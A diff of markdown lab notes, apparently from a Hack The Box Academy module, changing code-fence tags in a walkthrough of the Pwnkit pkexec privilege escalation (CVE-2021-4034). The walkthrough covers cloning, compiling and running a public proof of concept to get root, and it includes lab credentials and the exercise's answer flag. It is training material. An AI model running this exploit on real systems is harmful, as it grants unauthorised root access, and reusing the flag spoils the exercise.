@@ -16,7 +16,7 @@ PolKit also comes with three additional programs:
 
 The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.
 
-```sh
+```shellsession
 # pkexec -u <user> <command>
 $ pkexec -u root id
 
@@ -25,7 +25,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 In the pkexec tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) was found, also known as Pwnkit and also leads to privilege escalation. 
 
-```sh
+```shellsession
 $ git clone https://github.com/arthepsy/CVE-2021-4034.git
 $ cd CVE-2021-4034
 $ gcc cve-2021-4034-poc.c -o poc
@@ -40,12 +40,12 @@ uid=0(root) gid=0(root) groups=0(root)
 SSH to 10.129.205.113 (ACADEMY-LLPE-POLKIT), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{p0Lk1tt3n}**
    - Polkit is running a version that is vulnerable to CVE-2021-4034:
-        ```sh
+        ```shellsession
         $ pkexec --version
         pkexec version 0.105
         ```
    - Download the PoC and deliver it to the victim:
-        ```sh
+        ```shellsession
         $ git clone https://github.com/arthepsy/CVE-2021-4034
         Cloning into 'CVE-2021-4034'...
         remote: Enumerating objects: 18, done.
@@ -60,7 +60,7 @@ SSH to 10.129.205.113 (ACADEMY-LLPE-POLKIT), with user `htb-student` and passwor
         cve-2021-4034-poc.c                           100% 1267     8.0KB/s   00:00
         ```
    - Compile the PoC at victim and execute it to gain root and read the flag:
-        ```sh
+        ```shellsession
         $ gcc cve-2021-4034-poc.c -o poc
         $ ./poc
         # id
